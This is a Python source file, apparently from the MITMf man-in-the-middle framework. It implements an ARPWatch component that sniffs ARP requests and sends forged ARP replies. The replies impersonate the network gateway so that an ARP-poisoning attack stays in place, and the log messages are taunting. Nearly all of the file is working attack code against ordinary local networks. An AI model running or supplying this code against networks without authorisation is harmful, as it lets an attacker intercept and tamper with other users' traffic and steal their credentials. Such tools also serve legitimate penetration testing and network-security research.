import logging
import os
import sys
import threading

from scapy.all import *
from core.utils import shutdown

mitmf_logger = logging.getLogger('mitmf')

class ARPWatch:

    def __init__(self, gatewayip, myip, interface):
        self.gatewayip  = gatewayip
        self.gatewaymac = None
        self.myip       = myip
        self.interface  = interface
        self.debug      = False
        self.watch      = True

    def start(self):
        try:
            self.gatewaymac = getmacbyip(self.gatewayip)
            if self.gatewaymac is None:
                shutdown("[ARPWatch] Error: Could not resolve gateway's MAC address")
        except Exception, e:
            shutdown("[ARPWatch] Exception occured while resolving gateway's MAC address: {}".format(e))

        mitmf_logger.debug("[ARPWatch] gatewayip  => {}".format(self.gatewayip))
        mitmf_logger.debug("[ARPWatch] gatewaymac => {}".format(self.gatewaymac))
        mitmf_logger.debug("[ARPWatch] myip       => {}".format(self.myip))
        mitmf_logger.debug("[ARPWatch] interface  => {}".format(self.interface))

        t = threading.Thread(name='ARPWatch', target=self.startARPWatch)
        t.setDaemon(True)
        t.start()

    def stop(self):
        mitmf_logger.debug("[ARPWatch] shutting down")
        self.watch = False

    def startARPWatch(self):
        sniff(prn=self.arp_monitor_callback, filter="arp", store=0)

    def arp_monitor_callback(self, pkt):
        if self.watch is True: #Prevents sending packets on exiting
            if ARP in pkt and pkt[ARP].op == 1: #who-has only
                #broadcast mac is 00:00:00:00:00:00
                packet = None
                #print str(pkt[ARP].hwsrc) #mac of sender
                #print str(pkt[ARP].psrc) #ip of sender
                #print str(pkt[ARP].hwdst) #mac of destination (often broadcst)
                #print str(pkt[ARP].pdst) #ip of destination (Who is ...?)

                if (str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and str(pkt[ARP].pdst) == self.gatewayip and self.myip != str(pkt[ARP].psrc)):
                    mitmf_logger.debug("[ARPWatch] {} is asking where the Gateway is. Sending reply: I'm the gateway biatch!'".format(pkt[ARP].psrc))
                    #send repoison packet
                    packet = ARP()
                    packet.op = 2
                    packet.psrc = self.gatewayip
                    packet.hwdst = str(pkt[ARP].hwsrc)
                    packet.pdst = str(pkt[ARP].psrc)

                elif (str(pkt[ARP].hwsrc) == self.gatewaymac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip != str(pkt[ARP].pdst)):
                    mitmf_logger.debug("[ARPWatch] Gateway asking where {} is. Sending reply: I'm {} biatch!".format(pkt[ARP].pdst, pkt[ARP].pdst))
                    #send repoison packet
                    packet = ARP()
                    packet.op = 2
                    packet.psrc = self.gatewayip
                    packet.hwdst = '00:00:00:00:00:00'
                    packet.pdst = str(pkt[ARP].pdst)

                elif (str(pkt[ARP].hwsrc) == self.gatewaymac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip == str(pkt[ARP].pdst)):    
                    mitmf_logger.debug("[ARPWatch] Gateway asking where {} is. Sending reply: This is the h4xx0r box!".format(pkt[ARP].pdst))

                    packet = ARP()
                    packet.op = 2
                    packet.psrc = self.myip
                    packet.hwdst = str(pkt[ARP].hwsrc)
                    packet.pdst = str(pkt[ARP].psrc)

                try:
                    if packet is not None:
                        send(packet, verbose=self.debug, iface=self.interface)
                except Exception, e:
                    mitmf_logger.error("[ARPWatch] Error sending re-poison packet: {}".format(e))
                    pass
